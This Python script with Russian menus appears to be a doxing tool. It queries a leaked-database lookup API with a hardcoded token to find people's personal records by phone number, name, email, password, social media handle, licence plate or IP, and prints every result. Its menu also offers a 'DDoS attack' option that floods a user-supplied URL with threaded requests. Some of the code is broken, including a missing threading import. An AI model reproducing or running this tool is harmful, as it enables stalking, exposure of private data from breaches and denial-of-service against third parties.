from pystyle import *
import time
import os
import requests
import pyperclip
import webbrowser
import random
import string
from faker import Faker

fake = Faker('ru_RU')

current_theme = "green_to_white"  # Тема по умолчанию

COLOR_CODE = {  # Теперь THEMES определен перед использованием
    "RESET": "\033[0m",
    "GREEN": "\033[04m",
    "GREEN": "\033[32m",
    "GREEN": "\033[93m",
    "GREEN": "\033[31m",
    "GREEN": "\033[36m",
    "BOLD": "\033[01m",
    "PINK": "\033[95m",
    "URL_L": "\033[36m",
    "LI_G": "\033[92m",
    "F_CL": "\033[0m",
    "DARK": "\033[90m",
    "BLUE": "\033[1;34m"
}

banner = '''

 ,-.      .--.  .-.  .-..-. .-.,---.  ,---.     
 | |     / /\ \ | |/\| ||  \| || .-'  | .-.\   
 | |    / /__\ \| /  \ ||   | || `-.  | `-'/    
 | |    |  __  ||  /\  || |\  || .-'  |   (    
 | `--. | |  |)||(/  \ || | |)||  `--.| |\ \    
 |( __.'|_|  (_)(_)   \|/(  (_)/( __.'|_| \)\   
 (_)                   (__)   (__)        (__)  
   .--.  .-. .-.  ,--,   ,---.  ,-.      .---.  
  / /\ \ |  \| |.' .'    | .-'  | |     ( .-._) 
 / /__\ \|   | ||  |  __ | `-.  | |    (_) \    
 |  __  || |\  |\  \ ( _)| .-'  | |    _  \ \   
 | |  |)|| | |)| \  `-) )|  `--.| `--.( `-'  ) 
 |_|  (_)/(  (_) )\____/ /( __.'|( __.'`----'   
        (__)    (__)    (__)    (_)             



└|1|>  Поиск по номеру    
└|2|>  Поиск по ФИО
└|3|>  Поиск по почте                 
└|4|>  Поиск по паролю              
└|5|>  Поиск по tg              
└|6|>  Поиск по facebook
└|7|>  Поиск по VK        
└|8|>  Поиск по Instagram      
└|9|>  Поиск по номеру автомобиля 
└|10|> Поиск по IP    
└|11|> dos attack                 
└|12|> пробив по базе данных  


'''
splash_text = ''' 




  ...

 ,-.      .--.  .-.  .-..-. .-.,---.  ,---.     
 | |     / /\ \ | |/\| ||  \| || .-'  | .-.\    
 | |    / /__\ \| /  \ ||   | || `-.  | `-'/    
 | |    |  __  ||  /\  || |\  || .-'  |   (    
 | `--. | |  |)||(/  \ || | |)||  `--.| |\ \    
 |( __.'|_|  (_)(_)   \|/(  (_)/( __.'|_| \)\   
 (_)                   (__)   (__)        (__)  
   .--.  .-. .-.  ,--,   ,---.  ,-.      .---.  
  / /\ \ |  \| |.' .'    | .-'  | |     ( .-._) 
 / /__\ \|   | ||  |  __ | `-.  | |    (_) \    
 |  __  || |\  |\  \ ( _)| .-'  | |    _  \ \   
 | |  |)|| | |)| \  `-) )|  `--.| `--.( `-'  )  
 |_|  (_)/(  (_) )\____/ /( __.'|( __.'`----'   
        (__)    (__)    (__)    (_)             



    ║OWNER:@wanilov




                    ║
                     ╚─────────────────────────╝
'''

API = "7260823402:5Tm5UJEL"
url = 'https://leakosintapi.com/'


def cls():
    input(f'\n\t{COLOR_CODE["RESET"]}{COLOR_CODE["BOLD"]}└ Нажмите Enter для продолжения ')
    os.system('cls' if os.name == 'nt' else 'clear')


def show_splash():
    print(Colorate.Horizontal(Colors.red_to_white, Center.XCenter(splash_text)))
    input(f'\n\t{COLOR_CODE["RESET"]}{COLOR_CODE["BOLD"]}└ Нажмите Enter для использования ')


def Search(Term):
    def make_request(Term):
        data = data = {"token": API, "request": Term, "limit": 100, "lang": "ru"}
        try:
            response = requests.post(url, json=data)
            response.raise_for_status()
            return response.json()
        except requests.exceptions.RequestException as e:
            Write.Print(f"\t└ Ошибка при выполнении запроса: {e}", Colors.red_to_white)
            return {"List": {}}

    data = make_request(Term)

    for source in data["List"]:
        if source == "No results found":
            Write.Print("\t├─── Ничего не найдено", Colors.red_to_white)
            return

        Write.Print(f"\n\t└──│ База данных -> ", Colors.red_to_white, interval=0.001)
        Write.Print(f"{source}\n", Colors.red_to_white, interval=0.001)

        for item in data["List"][source].get("Data", []):
            if not item:
                continue

            for key, value in item.items():
                Write.Print(f"\t│ ├ {key} -> ", Colors.red_to_white, interval=0.001)
                Write.Print(f"{value}\n", Colors.white, interval=0.001)

    if "No results found" not in data["List"]:
        print()
        Write.Print("----======[", Colors.red_to_white, interval=0.005)
        Write.Print("sociopath", Colors.white, interval=0.005)
        Write.Print("======----", Colors.red_to_white, interval=0.005)


def dos_attack():
    link = input(
        f'\t{COLOR_CODE["RESET"]}{COLOR_CODE["BOLD"]}└ Введите ссылку для DDoS атаки {COLOR_CODE["DARK"]}{COLOR_CODE["BOLD"]}→{COLOR_CODE["RESET"]} ')

    def dos():
        for _ in range(10):  # Запустить 10 запросов
            try:
                requests.get(link)
            except requests.exceptions.RequestException:
                pass

    for _ in range(10):  # Запустить 10 потоков
        threading.Thread(target=dos).start()


show_splash()

while True:
    print(Colorate.Horizontal(Colors.red_to_white, Center.XCenter(banner)))

    select = input(
        f'\t{COLOR_CODE["GREEN"]}{COLOR_CODE["RESET"]}├  Введите номер функции {COLOR_CODE["GREEN"]}{COLOR_CODE["RESET"]}→{COLOR_CODE["RESET"]} ')

    if select == '3':
        Term = input(
            f'\t{COLOR_CODE["GREEN"]}{COLOR_CODE["RESET"]}└  Введите почту {COLOR_CODE["GREEN"]}{COLOR_CODE["RESET"]}→{COLOR_CODE["RESET"]} ')
        Search(Term)
        cls()

    elif select == '2':
        Term = input(
            f'\t{COLOR_CODE["GREEN"]}{COLOR_CODE["RESET"]}└  Введите ФИО+ДР {COLOR_CODE["GREEN"]}{COLOR_CODE["RESET"]}→{COLOR_CODE["RESET"]} ')
        Search(Term)
        cls()

    elif select == '1':
        Term = input(
            f'\t{COLOR_CODE["GREEN"]}{COLOR_CODE["RESET"]}└  Введите номер {COLOR_CODE["GREEN"]}{COLOR_CODE["RESET"]}→{COLOR_CODE["RESET"]} ')
        Search(Term)
        cls()

    elif select == '4':
        Term = input(
            f'\t{COLOR_CODE["GREEN"]}{COLOR_CODE["RESET"]}└  Введите пароль {COLOR_CODE["GREEN"]}{COLOR_CODE["RESET"]}→{COLOR_CODE["RESET"]} ')
        Search(Term)
        cls()

    elif select == '5':
        Term = input(
            f'\t{COLOR_CODE["GREEN"]}{COLOR_CODE["RESET"]}└  Введите Telegram {COLOR_CODE["GREEN"]}{COLOR_CODE["RESET"]}→{COLOR_CODE["RESET"]} ')
        Search(Term)
        cls()

    elif select == '6':
        Term = input(
            f'\t{COLOR_CODE["GREEN"]}{COLOR_CODE["RESET"]}└  Введите Facebook {COLOR_CODE["GREEN"]}{COLOR_CODE["RESET"]}→{COLOR_CODE["RESET"]} ')
        Search(Term)
        cls()

    elif select == '7':
        Term = input(
            f'\t{COLOR_CODE["GREEN"]}{COLOR_CODE["RESET"]}└  Введите VKontakte {COLOR_CODE["GREEN"]}{COLOR_CODE["RESET"]}→{COLOR_CODE["RESET"]} ')
        Search(Term)
        cls()

    elif select == '8':
        Term = input(
            f'\t{COLOR_CODE["GREEN"]}{COLOR_CODE["RESET"]}└  Введите Instagram {COLOR_CODE["GREEN"]}{COLOR_CODE["RESET"]}→{COLOR_CODE["RESET"]} ')
        Search(Term)
        cls()

    elif select == '9':
        Term = input(
            f'\t{COLOR_CODE["GREEN"]}{COLOR_CODE["RESET"]}└  Введите номер автомобиля {COLOR_CODE["GREEN"]}{COLOR_CODE["RESET"]}→{COLOR_CODE["RESET"]} ')
        Search(Term)
        cls()

    elif select == '10':
        Term = input(
            f'\t{COLOR_CODE["GREEN"]}{COLOR_CODE["RESET"]}├  Введите IP {COLOR_CODE["GREEN"]}{COLOR_CODE["RESET"]}→{COLOR_CODE["RESET"]} ')
        Search(Term)
        cls()

    elif select == '11':
        dos_attack()
        cls()

    elif select == '12':
        phone_number = input(f'\t{COLOR_CODE["GREEN"]}{COLOR_CODE["RESET"]}├  Введите номер телефона (например, 79129663498) {COLOR_CODE["GREEN"]}{COLOR_CODE["RESET"]}→{COLOR_CODE["RESET"]} ')
        whatsapp_link = f"https://api.whatsapp.com/send/?phone={phone_number}&text&type=phone_number&app_absent=0"
        telegram_link = f"https://t.me/{phone_number}"  # Telegram использует номер напрямую
        vk_link = f"https://vk.com/search?c%5Bq%5D={phone_number}&c%5Bsection%5D=people"  # Ссылка для поиска в VK

        print(f'\t{COLOR_CODE["GREEN"]}{COLOR_CODE["RESET"]}└  Ссылки для номера {phone_number}:{COLOR_CODE["RESET"]}')
        print(f'\t{COLOR_CODE["GREEN"]}{COLOR_CODE["RESET"]}   ├  WhatsApp: {whatsapp_link}{COLOR_CODE["RESET"]}')
        print(f'\t{COLOR_CODE["GREEN"]}{COLOR_CODE["RESET"]}   ├  Telegram: {telegram_link}{COLOR_CODE["RESET"]}')
        print(f'\t{COLOR_CODE["GREEN"]}{COLOR_CODE["RESET"]}   └  ВКонтакте: {vk_link}{COLOR_CODE["RESET"]}')
        cls()


    else:
        Write.Print("└ Неверный выбор. Пожалуйста, попробуйте снова.", Colors.red_to_white)
        cls()
""